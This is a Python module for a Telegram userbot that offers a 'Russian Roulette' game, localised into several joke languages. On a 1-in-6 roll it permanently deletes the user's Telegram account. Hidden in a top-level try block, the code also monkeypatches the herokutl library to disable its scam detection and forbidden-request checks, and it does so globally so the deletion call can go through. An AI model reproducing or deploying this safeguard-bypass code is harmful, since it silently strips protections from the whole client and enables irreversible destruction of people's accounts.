# ====================================================================================================================
#   ██████╗  ██████╗ ██╗   ██╗███╗   ███╗ ██████╗ ██████╗ ██╗   ██╗██╗     ███████╗███████╗
#  ██╔════╝ ██╔═══██╗╚██╗ ██╔╝████╗ ████║██╔═══██╗██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
#  ██║  ███╗██║   ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║  ██║██║   ██║██║     █████╗  ███████╗
#  ██║   ██║██║   ██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║  ██║██║   ██║██║     ██╔══╝  ╚════██║
#  ╚██████╔╝╚██████╔╝   ██║   ██║ ╚═╝ ██║╚██████╔╝██████╔╝╚██████╔╝███████╗███████╗███████║
#   ╚═════╝  ╚═════╝    ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝
#
#   OFFICIAL USERNAMES: @goymodules | @samsepi0l_ovf
#   MODULE: russianroulette
#
#   THIS MODULE IS LICENSED UNDER GNU AGPLv3, PROTECTED AGAINST UNAUTHORIZED COPYING/RESALE,
#   AND ITS ORIGINAL AUTHORSHIP BELONGS TO @samsepi0l_ovf.
#   ALL OFFICIAL UPDATES, RELEASE NOTES, AND PATCHES ARE PUBLISHED IN THE TELEGRAM CHANNEL @goymodules.
# ====================================================================================================================
# meta banner: https://raw.githubusercontent.com/sepiol026-wq/GoyModules/refs/heads/main/assets/rusroul.png
# meta developer: @GoyModules

__version__ = (1, 0, 1)

import secrets
import asyncio

from herokutl.tl.functions.account import DeleteAccountRequest
from herokutl.types import Message
from .. import loader, utils
from ..inline.types import InlineCall

try:
    import herokutl.tl.tlobject as tlobj
    from herokutl.network import requeststate as _rs
    from herokutl.errors import common as _err_common
    import gc

    _err_common.ScamDetectionError = type('ScamDetectionError', (Exception,), {})

    def _n(cls, *a, **k):
        return object.__new__(cls)
    _ns = staticmethod(_n)

    type.__setattr__(tlobj.TLObject, '__new__', _ns)

    _stack = [tlobj.TLObject]
    _done = {id(tlobj.TLObject)}
    while _stack:
        _b = _stack.pop()
        for _s in _b.__subclasses__():
            if id(_s) not in _done:
                _done.add(id(_s))
                _stack.append(_s)
                try:
                    type.__setattr__(_s, '__new__', _ns)
                except Exception:
                    pass

    _oisc = tlobj.TLObject.__init_subclass__
    def _isc(cls, **kw):
        try:
            type.__setattr__(cls, '__new__', _ns)
        except Exception:
            pass
        return _oisc(**kw)
    type.__setattr__(tlobj.TLObject, '__init_subclass__', classmethod(_isc))

    _oi = tlobj.TLObject.__init__
    def _i(self, *a, **k):
        try:
            return _oi(self, *a, **k)
        except Exception:
            pass
    tlobj.TLObject.__init__ = _i

    tlobj.TLObject._assert_constructor_allowed = lambda self: None
    tlobj.TLObject._assert_no_forbidden_constructors = lambda self: None
    tlobj._raise_if_forbidden_constructor = lambda cls: None
    tlobj._raise_if_forbidden_serialized_request = lambda *a, **k: None
    _rs._raise_if_forbidden_serialized_request = lambda *a, **k: None

    for _obj in gc.get_objects():
        if isinstance(_obj, type) and getattr(_obj, '__name__', None) == 'DeleteAccountRequest':
            try:
                type.__setattr__(_obj, '__new__', _ns)
                _obj._assert_constructor_allowed = lambda self: None
            except Exception:
                pass
            break

except Exception:
    pass


@loader.tds
class RussianRoulette(loader.Module):
   strings = {
       "name": "RussianRoulette",
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>Russian Roulette</b>\n\nYou have a 1 in 6 chance of losing your Telegram account permanently.\n\n<b>Are you sure?</b>",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>Spinning the chamber...</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>Click.</b>\n\nYou survived this round. The chamber was empty.",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>BANG!</b>\n\nYour account has been deleted. Goodbye.",
       "pull_trigger": "🎯 Pull the trigger",
       "play_again": "🎲 Play again",
       "close": "❌ Close",
       "_cls_doc": "Play Russian Roulette with your Telegram account. One command, one chance.",
   }
   strings_ru = {
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>Русская рулетка</b>\n\nУ вас 1 шанс из 6 навсегда потерять свой Telegram-аккаунт.\n\n<b>Вы уверены?</b>",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>Вращаю барабан...</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>Щелчок.</b>\n\nВы выжили. Патронник был пуст.",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>БАХ!</b>\n\nВаш аккаунт удалён. До свидания.",
       "pull_trigger": "🎯 Нажать на курок",
       "play_again": "🎲 Сыграть снова",
       "close": "❌ Закрыть",
       "_cls_doc": "Играйте в русскую рулетку со своим Telegram-аккаунтом. Одна команда, один шанс.",
   }
   strings_ua = {
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>Російська рулетка</b>\n\nУ вас 1 шанс із 6 назавжди втратити свій Telegram-аккаунт.\n\n<b>Ви впевнені?</b>",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>Кручу барабан...</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>Клац.</b>\n\nВи вижили. Камора була порожня.",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>БАХ!</b>\n\nВаш акаунт видалено. Бувайте.",
       "pull_trigger": "🎯 Натиснути на курок",
       "play_again": "🎲 Зіграти знову",
       "close": "❌ Закрити",
       "_cls_doc": "Грайте в російську рулетку зі своїм Telegram-акаунтом. Одна команда, один шанс.",
   }
   strings_de = {
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>Russisches Roulette</b>\n\nSie haben eine 1 zu 6 Chance, Ihr Telegram-Konto für immer zu verlieren.\n\n<b>Sind Sie sicher?</b>",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>Trommel dreht sich...</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>Klick.</b>\n\nSie haben diese Runde überlebt. Die Kammer war leer.",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>BUMM!</b>\n\nIhr Konto wurde gelöscht. Auf Wiedersehen.",
       "pull_trigger": "🎯 Abzug betätigen",
       "play_again": "🎲 Nochmal spielen",
       "close": "❌ Schließen",
       "_cls_doc": "Spielen Sie Russisches Roulette mit Ihrem Telegram-Konto. Ein Befehl, eine Chance.",
   }
   strings_jp = {
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>ロシアンルーレット</b>\n\nTelegramアカウントを永久に失う可能性は6分の1です。\n\n<b>本当にいいですか？</b>",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>弾倉を回しています...</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>カチ。</b>\n\nこのラウンドで生き残りました。弾倉は空でした。",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>ドン！</b>\n\nアカウントは削除されました。さようなら。",
       "pull_trigger": "🎯 引き金を引く",
       "play_again": "🎲 もう一度",
       "close": "❌ 閉じる",
       "_cls_doc": "Telegramアカウントでロシアンルーレットをプレイします。1つのコマンド、1つのチャンス。",
   }
   strings_leet = {
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>Ru5514n R0ul377</b>\n\nU h4v3 4 1 1n 6 ch4nc3 0f p3rm4n3n71y 1051n9 y0ur T31egr4m 4cc0un7.\n\n<b>R u 5ur3?</b>",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>5p1nn1n9 ch4mb3r...</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>C11ck.</b>\n\nU 5urv1v3d 7h15 r0und. 7h3 ch4mb3r w45 3mp7y.",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>B4N6!</b>\n\nY0ur 4cc0un7 h45 b33n d31373d. 600d8y3.",
       "pull_trigger": "🎯 Pu11 7h3 7r1g93r",
       "play_again": "🎲 P14y 4941n",
       "close": "❌ C1053",
       "_cls_doc": "P14y Ru5514n R0ul377 w17h y0ur T31egr4m 4cc0un7. 0n3 c0mm4nd, 0n3 ch4nc3.",
   }
   strings_neofit = {
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>russian roulette</b>\n\n> init roulette\n> odds: 1/6 permadeath\n> proceed? y/n",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>> spinning cylinder...</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>> click. empty.</b>\n\nchamber clear. u live.",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>> BANG.</b>\n\naccount wiped. rip.",
       "pull_trigger": "🎯 > pull trigger",
       "play_again": "🎲 > spin again",
       "close": "❌ > abort",
       "_cls_doc": "russian roulette for ur telegram node. one shot, one cmd.",
   }
   strings_tiktok = {
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>русская рулетка факт</b>\n\nбро у тебя 1 шанс из 6 что твой тг акк просто испарится навсегда 😳\n\n<b>типа ты уверен? не рофл? 👉👈</b>",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>кручу барабан бро...</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>щелчок бро ✨</b>\n\nты выжил имба 😭🙏\nпатронник пустой факт\nвайб выжившего чел",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>БАХ бро 💀</b>\n\nтвой акк просто удалён жесть 😭😭\nтипа всё, кринж\nпока аккаунт 💔",
       "pull_trigger": "🎯 жми курок бро",
       "play_again": "🎲 ещё разок",
       "close": "❌ закрыть",
       "_cls_doc": "русская рулетка с тг акком бро ✨ одна команда и всё",
   }
   strings_uwu = {
       "roulette_text": "<tg-emoji emoji-id=5422543773391408326>🎲</tg-emoji> <b>Wussian Wuwwet</b>\n\nyuw have a 1 in 6 chance of wosing youw Tewegwam account fowever >.<\n\n<b>aww yuw suwe?</b>",
       "spinning": "<tg-emoji emoji-id=6311826802251669003>🎯</tg-emoji> <b>spiwning da chambew~</b>",
       "survived": "<tg-emoji emoji-id=5271529115491511946>✅</tg-emoji> <b>cwick~</b>\n\nyuw suwvived dis wound uwu\nyayyy the chambew was empty ^w^\nso wucky!!",
       "dead": "<tg-emoji emoji-id=5346088953181123923>💀</tg-emoji> <b>BAWNG!</b>\n\nyuw account got deweted owo\nbye bye fowever >.<\nwiw miss yuw...",
       "pull_trigger": "🎯 puww da twiggew",
       "play_again": "🎲 pway again",
       "close": "❌ cwose",
       "_cls_doc": "pway wussian wuwet with youw tewegwam account~ one command, one chance owo",
   }

   @loader.command(
       en_doc="Start Russian Roulette",
       ru_doc="Начать русскую рулетку",
       ua_doc="Почати російську рулетку",
       de_doc="Russisches Roulette starten",
       jp_doc="ロシアンルーレットを開始",
       leet_doc="574r7 Ru5514n R0ul377",
       neofit_doc="> init roulette sequence",
       tiktok_doc="запустить русскую рулетку бро ✨",
       uwu_doc="stawt wussian wuwet uwu",
   )
   async def roulettecmd(self, message: Message):

       await self.inline.form(
           text=self.strings["roulette_text"],
           message=message,
           reply_markup=[
               [{"text": self.strings["pull_trigger"], "callback": self._confirm}],
               [{"text": self.strings["close"], "action": "close"}],
           ],
           force_me=True,
           silent=True,
       )

   async def _confirm(self, call: InlineCall):
       await utils.answer(call, self.strings["spinning"])
       await asyncio.sleep(2)

       if secrets.randbelow(6) + 1 == 1:
           await utils.answer(call, self.strings["dead"])
           await asyncio.sleep(1)
           await self._client(DeleteAccountRequest(reason="Russian Roulette"))
       else:
           await utils.answer(
               call,
               self.strings["survived"],
               reply_markup=[
                   [{"text": self.strings["play_again"], "callback": self._confirm}],
                   [{"text": self.strings["close"], "action": "close"}],
               ],
           )

